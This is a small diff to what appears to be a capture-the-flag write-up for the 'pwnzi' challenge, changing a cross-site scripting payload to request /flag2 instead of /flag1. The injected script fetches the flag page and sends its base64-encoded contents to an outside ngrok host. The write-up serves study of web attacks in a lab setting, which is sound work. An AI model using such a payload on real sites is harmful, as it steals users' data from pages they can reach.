@@ -142,7 +142,7 @@ At this point I thought surely outbound requests must be blocked and the challen
 ```
 <script>
 function myFunction() {
-  fetch("/flag1",{referrer:"https://pwnzi.ctf.spamandhex.com/profile.html"}).then(resp => resp.text()).then(text => {
+  fetch("/flag2",{referrer:"https://pwnzi.ctf.spamandhex.com/profile.html"}).then(resp => resp.text()).then(text => {
         fetch("https://e979154e.ngrok.io/flag="+btoa(text));
   });
 }
